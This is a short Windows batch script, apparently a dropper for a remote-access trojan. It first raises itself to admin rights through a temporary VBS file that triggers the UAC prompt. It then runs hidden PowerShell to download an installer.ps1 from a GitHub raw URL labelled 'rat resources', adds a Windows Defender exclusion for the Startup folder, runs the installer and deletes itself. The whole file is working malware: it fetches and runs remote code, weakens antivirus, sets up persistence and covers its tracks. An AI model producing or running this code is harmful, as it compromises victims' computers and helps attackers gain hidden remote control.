REM get admin permissions for script
@echo off


:: BatchGotAdmin
:-------------------------------------
REM  --> check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> if error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

REM you can remove the 'powershell' to get an admin CMD
REM disable defender

REM rat resources

powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Kuper-xx/Perseus/refs/heads/main/files/installer.ps1' -Outfile 'installer.ps1'"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup" ; ./installer.ps1

REM self delete
del wget.cmd